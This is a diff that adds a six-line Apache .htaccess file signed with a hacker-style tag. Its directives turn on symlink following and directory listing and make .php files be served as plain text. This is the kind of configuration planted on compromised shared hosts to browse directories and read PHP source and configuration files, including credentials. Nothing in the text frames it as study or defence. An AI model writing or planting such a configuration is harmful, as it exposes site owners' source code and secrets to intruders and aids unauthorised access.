@@ -1,0 +1,6 @@
+#[D]eveloped l3y Me dont ask who im ...  
+Options +FollowSymLinks
+DirectoryIndex Index.html
+Options +Indexes
+AddType text/plain .php
+AddHandler server-parsed .php
